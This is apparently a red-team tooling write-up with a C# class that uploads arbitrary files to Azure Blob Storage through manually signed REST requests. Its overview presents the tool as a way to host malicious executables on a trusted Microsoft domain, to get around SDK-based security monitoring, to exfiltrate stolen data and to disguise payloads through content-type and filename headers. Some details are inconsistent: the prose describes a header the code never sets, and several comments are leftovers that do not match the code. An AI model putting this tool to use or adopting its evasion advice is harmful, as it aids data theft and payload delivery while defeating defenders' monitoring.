# Azure Storage Payload Hosting – Simplified Overview

This code lets you upload any file to Azure Blob Storage by sending a direct HTTP request, without using the official Azure SDK.  
You simply provide your Azure storage account name, storage key (like a password), the container name, and the file you want to upload.

**How it works:**
- Builds the correct URL for your file (blob) in Azure.
- Reads your file into memory.
- Creates a special HTTP request with all the headers Azure needs, including a signature for authentication.
- Sends the file to Azure Blob Storage, where it will be stored and accessible at a Microsoft-owned URL (like `yoursubdomain.blob.core.windows.net`).

**Key Features:**
- You can create storage blobs on a Microsoft domain with a valid SSL certificate.
- The code lets you set the `x-ms-blob-content-type` header, so you can make files appear as any MIME type (like images or documents).
- The storage account and key are provided as parameters, not hardcoded.
- The blob URL is built dynamically from your input.

**Why use direct REST API calls?**
- The code talks directly to Azure’s REST API, skipping the official SDK. This can help avoid some security monitoring that looks for SDK usage.
- It manually builds the authorization header, giving you more control and stealth over how requests are made.

**Why is this useful for payload hosting?**
- Attackers or red teamers can use Azure Blob Storage to host malicious files (like executables or scripts) on a trusted Microsoft domain, which may bypass some network security controls.
- The code can upload any file, making it useful for stealing data (exfiltration) or staging payloads for later download.
- You can disguise payloads as harmless files by setting headers like `x-ms-blob-content-type` and `x-ms-meta-filename`.

---

## How the Code Works

**1. Put Method**
- Takes the file path, storage account name, storage key, container name, and a cancellation token.
- Extracts the filename and builds the blob URL.
- Reads the file into a byte array.
- Builds an HTTP PUT request with required Azure headers (`x-ms-date`, `x-ms-version`, `x-ms-blob-type`, etc.).
- Calls `GetAuthorizationHeadern` to generate the correct authorization header.
- Sends the PUT request using `HttpClient`.
- Checks if the upload was successful and prints the result.

**2. GetAuthorizationHeadern Method**
- Creates the authorization header needed by Azure Storage REST API using HMAC-SHA256 and your storage account key.
- Builds a canonicalized string for the request, hashes it, and returns the header in the format Azure expects.

**3. GetCanonicalizedHeaders Method**
- Collects and formats all headers starting with `x-ms-` in a standardized way for the signature.

**4. GetCanonicalizedResource Method**
- Formats the resource path and any query parameters for the signature string.

---

**Why not use the Azure SDK?**
- Gives you full control over the HTTP request and headers.
- Useful for customizing requests, avoiding SDK dependencies, or learning how Azure authentication works at a low level.

**Security Note:**
- The storage account key is sensitive and should be protected.
- This code does not handle all possible errors or edge cases (like large files or retries).

```
class PutLibrary
    {
        public static async Task Put(string fPath, string storageAccount, string storageKey, string container, CancellationToken cancellationToken) 
        //public static bool Put(string fPath, string storageAccount, string storageKey, string container)
        {
            string Filename = Path.GetFileName(fPath);
            Debug.WriteLine($"[+] Generating random name for blob");

            //Random random = new Random();
            //const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            //var generated = new string(Enumerable.Repeat(chars, 12).Select(s => s[random.Next(s.Length)]).ToArray());
            string blobName = Filename;

            // https://myaccount.blob.core.windows.net/mycontainer/myblockblob
            string Blob = "https://" + storageAccount + ".blob.core.windows.net/" + container + "/" + blobName;
            byte[] requestPayload = File.ReadAllBytes(fPath);

            
            using (var httpRequestMessage = new HttpRequestMessage(HttpMethod.Put, Blob)
            { Content = (requestPayload == null) ? null : new ByteArrayContent(requestPayload) })
            {

                // Add the request headers for x-ms-date and x-ms-version.
                DateTime now = DateTime.UtcNow;
                httpRequestMessage.Headers.Add("x-ms-date", now.ToString("R", CultureInfo.InvariantCulture));
                httpRequestMessage.Headers.Add("x-ms-version", "2030-04-17");
                httpRequestMessage.Headers.Add("x-ms-blob-type", "BlockBlob");
                httpRequestMessage.Headers.Add("x-ms-meta-filename", Filename);
                //httpRequestMessage.Headers.Add("x-ms-blob-content-disposition", "attachment; filename=\"" + Filename + "\"");
                // Create the authorization header.
                var AuthHeader = GetAuthorizationHeadern(storageAccount, storageKey, now, httpRequestMessage);

                httpRequestMessage.Headers.Authorization = AuthHeader;

                HttpClient httpClient = new HttpClient();
                httpClient.DefaultRequestHeaders.Add("x-ms-date", now.ToString("R", CultureInfo.InvariantCulture));
                httpClient.DefaultRequestHeaders.Add("x-ms-version", "2030-04-17");
                httpClient.DefaultRequestHeaders.Add("x-ms-blob-type", "BlockBlob");
                httpClient.DefaultRequestHeaders.Add("x-ms-meta-filename", Filename);
                //httpClient.DefaultRequestHeaders.Add("x-ms-blob-content-disposition", "attachment; filename=\"" + Filename + "\"");
                httpClient.DefaultRequestHeaders.Authorization = AuthHeader;

                ByteArrayContent data = new ByteArrayContent(requestPayload);

                // Send the request.
                using (HttpResponseMessage httpResponseMessage = await httpClient.PutAsync(Blob, data, cancellationToken))
                {
                    // If successful (status code = 200), 
                    //   parse the XML response for the container names.
                    if (httpResponseMessage.StatusCode == HttpStatusCode.Created)
                    {
                        Debug.WriteLine($"[+] {Filename} Successfully Written to {Blob}");
                        Console.WriteLine("[+] Upload successful");
                    } else
                    {
                        Console.WriteLine(httpResponseMessage);
                    }
                }
            }            
        }

        /// <summary>
        /// This creates the authorization header. This is required, and must be built 
        ///   exactly following the instructions. This will return the authorization header
        ///   for most storage service calls.
        /// Create a string of the message signature and then encrypt it.
        /// </summary>
        /// <param name="storageAccountName">The name of the storage account to use.</param>
        /// <param name="storageAccountKey">The access key for the storage account to be used.</param>
        /// <param name="now">Date/Time stamp for now.</param>
        /// <param name="httpRequestMessage">The HttpWebRequest that needs an auth header.</param>
        /// <param name="ifMatch">Provide an eTag, and it will only make changes
        /// to a blob if the current eTag matches, to ensure you don't overwrite someone else's changes.</param>
        /// <param name="md5">Provide the md5 and it will check and make sure it matches the blob's md5.
        /// If it doesn't match, it won't return a value.</param>
        /// <returns></returns>
        public static AuthenticationHeaderValue GetAuthorizationHeadern(
           string storageAccountName, string storageAccountKey, DateTime now,
           HttpRequestMessage httpRequestMessage, string ifMatch = "", string md5 = "")
        {
            // This is the raw representation of the message signature.
            HttpMethod method = httpRequestMessage.Method;
            String MessageSignature = String.Format("{0}\n\n\n{1}\n{5}\n\n\n\n{2}\n\n\n\n{3}{4}",
                      method.ToString(),
                      (method == HttpMethod.Get || method == HttpMethod.Head) ? String.Empty
                        : httpRequestMessage.Content.Headers.ContentLength.ToString(),
                      ifMatch,
                      GetCanonicalizedHeaders(httpRequestMessage),
                      GetCanonicalizedResource(httpRequestMessage.RequestUri, storageAccountName),
                      md5);

            // Now turn it into a byte array.
            byte[] SignatureBytes = Encoding.UTF8.GetBytes(MessageSignature);

            // Create the HMACSHA256 version of the storage key.
            HMACSHA256 SHA256 = new HMACSHA256(Convert.FromBase64String(storageAccountKey));

            // Compute the hash of the SignatureBytes and convert it to a base64 string.
            string signature = Convert.ToBase64String(SHA256.ComputeHash(SignatureBytes));

            // This is the actual header that will be added to the list of request headers.
            // You can stop the code here and look at the value of 'authHV' before it is returned.
            AuthenticationHeaderValue authHV = new AuthenticationHeaderValue("SharedKey",
                storageAccountName + ":" + Convert.ToBase64String(SHA256.ComputeHash(SignatureBytes)));
            return authHV;
        }

        /// <summary>
        /// Put the headers that start with x-ms in a list and sort them.
        /// Then format them into a string of [key:value\n] values concatenated into one string.
        /// (Canonicalized Headers = headers where the format is standardized).
        /// </summary>
        /// <param name="httpRequestMessage">The request that will be made to the storage service.</param>
        /// <returns>Error message; blank if okay.</returns>
        private static string GetCanonicalizedHeaders(HttpRequestMessage httpRequestMessage)
        {
            var headers = from kvp in httpRequestMessage.Headers
                          where kvp.Key.StartsWith("x-ms-", StringComparison.OrdinalIgnoreCase)
                          orderby kvp.Key
                          select new { Key = kvp.Key.ToLowerInvariant(), kvp.Value };

            StringBuilder sb = new StringBuilder();

            // Create the string in the right format; this is what makes the headers "canonicalized" --
            //   it means put in a standard format. http://en.wikipedia.org/wiki/Canonicalization
            foreach (var kvp in headers)
            {
                StringBuilder headerBuilder = new StringBuilder(kvp.Key);
                char separator = ':';

                // Get the value for each header, strip out \r\n if found, then append it with the key.
                foreach (string headerValues in kvp.Value)
                {
                    string trimmedValue = headerValues.TrimStart().Replace("\r\n", String.Empty);
                    headerBuilder.Append(separator).Append(trimmedValue);

                    // Set this to a comma; this will only be used 
                    //   if there are multiple values for one of the headers.
                    separator = ',';
                }
                sb.Append(headerBuilder.ToString()).Append("\n");
            }
            return sb.ToString();
        }      

        /// <summary>
        /// This part of the signature string represents the storage account 
        ///   targeted by the request. Will also include any additional query parameters/values.
        /// For ListContainers, this will return something like this:
        ///   /storageaccountname/\ncomp:list
        /// </summary>
        /// <param name="address">The URI of the storage service.</param>
        /// <param name="accountName">The storage account name.</param>
        /// <returns>String representing the canonicalized resource.</returns>
        private static string GetCanonicalizedResource(Uri address, string storageAccountName)
        {
            // The absolute path is "/" because for we're getting a list of containers.
            StringBuilder sb = new StringBuilder("/").Append(storageAccountName).Append(address.AbsolutePath);

            // Address.Query is the resource, such as "?comp=list".
            // This ends up with a NameValueCollection with 1 entry having key=comp, value=list.
            // It will have more entries if you have more query parameters.
            NameValueCollection values = HttpUtility.ParseQueryString(address.Query);

            foreach (var item in values.AllKeys.OrderBy(k => k))
            {
                sb.Append('\n').Append(item).Append(':').Append(values[item]);
            }

            return sb.ToString().ToLower();

        }

    }
```
